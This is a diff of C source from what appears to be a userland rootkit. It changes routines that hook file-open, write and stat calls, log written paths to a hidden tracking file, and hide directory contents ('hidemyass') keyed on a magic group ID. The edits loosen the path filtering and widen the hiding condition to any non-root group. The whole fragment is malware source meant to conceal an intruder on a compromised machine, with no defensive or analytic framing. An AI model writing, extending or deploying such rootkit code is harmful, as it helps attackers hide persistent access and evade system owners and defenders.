@@ -1,5 +1,5 @@
 int pathtracked(const char *pathname){
-    if(!strcmp(".\0", pathname) || !strcmp("..\0", pathname) || pathname[0] != '/')
+    if(pathname[0] != '/')
         return 1;
 
     for(int i = 0; i != NOTRACK_SIZE; i++)
@@ -56,12 +56,11 @@ int pathtracked(const char *pathname){
 void trackwrite(const char *pathname){
     FILE *fp;
     char buf[strlen(pathname)+2];
-    hook(CFOPEN, CFWRITE, CCHMOD);
-    if(pathtracked(pathname)) return;
-    fp = call(CFOPEN, ASS_PATH, "a+");
+    hook(CFOPEN, CFWRITE);
+    fp = call(CFOPEN, ASS_PATH, "a");
     if(fp == NULL) return;
-    snprintf(buf, sizeof(buf), "%s\n", pathname);
-    call(CFWRITE, buf, 1, strlen(buf), fp);
+    snprintf(buf,sizeof(buf),"%s\n",pathname);
+    call(CFWRITE, buf, strlen(buf), 1, fp);
     fclose(fp);
     chown_path(ASS_PATH, readgid());
 }
@@ -101,7 +100,7 @@ void hidemyass(void){
             if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                 continue;
 
-            if(assdirstat.st_gid == magicgid)
+            if(assdirstat.st_gid != 0)
                 hidedircontents(assdirname, magicgid);
         }
 
